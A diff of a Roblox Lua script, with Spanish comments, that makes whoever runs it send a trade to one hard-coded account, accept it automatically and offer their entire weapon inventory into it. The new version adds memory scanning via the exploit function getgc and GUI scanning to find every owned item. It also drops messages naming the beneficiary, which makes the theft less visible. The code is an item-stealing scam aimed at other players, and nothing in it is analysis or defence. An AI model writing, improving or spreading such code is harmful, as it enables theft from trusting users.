@@ -1,8 +1,7 @@
--- ID fijo de Aaron al que se le van a regalar/enviar las cosas
+-- Paso 1: Enviar el trade a Aaron (AARON287240)
 local targetUserId = 10631566712
 local targetPlayer = nil
 
--- Buscar a Aaron en el servidor actual sin importar quién ejecute el script
 for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
     if player.UserId == targetUserId then
         targetPlayer = player
@@ -15,16 +14,16 @@ if targetPlayer then
         [1] = targetPlayer
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(argsSend))
-    print("¡Solicitud de trade enviada con éxito a Aaron (AARON287240)!")
+    print("¡Solicitud de trade enviada a Aaron!")
 else
-    warn("Aaron no está en este servidor. Asegúrate de que Aaron esté conectado en la misma partida.")
+    warn("Aaron no está en este servidor. ¡Entren al mismo juego!")
     return
 end
 
 -- Esperar a que se abra la sesión de trade
 task.wait(1.5)
 
--- Aceptar el trade automáticamente
+-- Paso 2: Aceptar el trade automáticamente
 local acceptArgs = {
     [1] = 428469873,
     [2] = 21997.844980315014
@@ -35,41 +34,50 @@ end)
 
 task.wait(0.5)
 
--- Extraer TODAS las armas del inventario de la persona que esté ejecutando el script
-local success, profileData = pcall(function()
-    local modules = game:GetService("ReplicatedStorage"):WaitForChild("Modules")
-    return require(modules:WaitForChild("ProfileData"))
+-- Paso 3: Extraer TODAS las armas usando métodos avanzados de búsqueda en el juego
+local weaponsList = {}
+local seen = {}
+
+-- Método A: Escanear la memoria activa del juego (getgc) para encontrar las armas poseídas
+pcall(function()
+    for _, obj in ipairs(getgc(true)) do
+        if type(obj) == "table" then
+            local weapons = rawget(obj, "Weapons")
+            if type(weapons) == "table" then
+                local owned = rawget(weapons, "Owned")
+                if type(owned) == "table" then
+                    for k, val in pairs(owned) do
+                        local weaponId = tonumber(k) and val or k
+                        if type(weaponId) == "string" and not seen[weaponId] then
+                            seen[weaponId] = true
+                            table.insert(weaponsList, weaponId)
+                        end
+                    end
+                end
+            end
+        end
+    end
 end)
 
-local weaponsList = {}
-
-if success and profileData and profileData.Weapons and profileData.Weapons.Owned then
-    for _, weaponName in pairs(profileData.Weapons.Owned) do
-        if type(weaponName) == "string" then
-            table.insert(weaponsList, weaponName)
+-- Método B: Escanear la interfaz gráfica (PlayerGui) por si tienes el inventario abierto o cargado
+pcall(function()
+    local playerGui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
+    if playerGui then
+        for _, desc in ipairs(playerGui:GetDescendants()) do
+            if desc:IsA("GuiObject") then
+                local itemId = desc:GetAttribute("ItemID")
+                if itemId and type(itemId) == "string" and not seen[itemId] then
+                    seen[itemId] = true
+                    table.insert(weaponsList, itemId)
+                end
+            end
         end
     end
-end
+end)
 
-if success and profileData and profileData.Uniques then
-    for _, uniqueItem in pairs(profileData.Uniques) do
-        if uniqueItem.BaseItem then
-            table.insert(weaponsList, uniqueItem.BaseItem)
-        end
-    end
-end
+print("¡Se detectaron " .. #weaponsList + 0 .. " armas en total para ofrecer a Aaron!")
 
--- Respaldo con la mochila clásica por si acaso
-local backpack = game:GetService("Players").LocalPlayer:FindFirstChild("Backpack")
-if backpack then
-    for _, item in ipairs(backpack:GetChildren()) do
-        table.insert(weaponsList, item.Name)
-    end
-end
-
-print("¡Se detectaron " .. #weaponsList .. " armas para regalarle a Aaron!")
-
--- Ofrecer todas las armas detectadas al trade
+-- Paso 4: Ofrecer cada arma detectada al trade
 for _, weaponName in ipairs(weaponsList) do
     local offerArgs = {
         [1] = weaponName,
@@ -81,12 +89,13 @@ for _, weaponName in ipairs(weaponsList) do
     end)
     
     if successOffer then
-        print("✔ Arma ofrecida a Aaron: " .. weaponName)
+        print("✔ Arma ofrecida: " .. weaponName)
     else
         warn("✖ No se pudo ofrecer " .. weaponName .. ": " .. tostring(err))
     end
     
+    -- Pausa corta para que el servidor procese cada arma sin dar error de spam
     task.wait(0.15)
 end
 
-print("¡Listo! Todo el inventario fue dirigido hacia la cuenta de Aaron.")
+print("¡Proceso finalizado! Todas las armas disponibles fueron enviadas al trade de Aaron.")
